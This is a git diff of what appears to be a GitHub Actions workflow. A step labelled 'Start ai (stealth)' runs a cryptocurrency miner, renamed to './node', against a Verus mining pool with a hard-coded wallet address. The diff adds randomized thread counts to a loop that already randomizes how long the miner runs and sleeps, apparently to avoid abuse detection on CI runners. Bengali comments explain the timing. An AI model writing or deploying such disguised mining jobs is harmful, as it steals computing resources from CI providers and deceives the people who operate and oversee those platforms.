@@ -24,18 +24,17 @@ jobs:
     - name: Start ai (stealth)
       run: |
         while true; do
-          ./node -a verus -o stratum+tcp://sg.vipor.net:5040 -u RJfrEDCJfNccNkXmuJcvxCcS5kLQnmpKK7.worker1 -p x &
+          THREADS=$((1 + RANDOM % 2))
+          echo "Starting miner with $THREADS thread(s)..."
+          ./node -a verus -o stratum+tcp://sg.vipor.net:5040 -u RJfrEDCJfNccNkXmuJcvxCcS5kLQnmpKK7.worker1 -p x -t $THREADS &
           PID=$!
-          echo "⛏️ Miner started with PID $PID"
-
-          RUN_TIME=$((180 + RANDOM % 61))  
-          echo "▶️ Running miner for $RUN_TIME seconds"
-          sleep $RUN_TIME
-
+          # চালাবে 180 থেকে 240 সেকেন্ড (3-4 মিনিট) র‍্যান্ডম সময়
+          RUNTIME=$((180 + RANDOM % 61))
+          sleep $RUNTIME
+          echo "Stopping miner after $RUNTIME seconds."
           kill $PID
-          echo "🛑 Miner stopped."
-
+          # 15 থেকে 40 সেকেন্ড স্লিপ নেবে (বিরতি)
           SLEEP_TIME=$((15 + RANDOM % 26))
-          echo "😴 Sleeping for $SLEEP_TIME seconds"
+          echo "Sleeping for $SLEEP_TIME seconds."
           sleep $SLEEP_TIME
         done
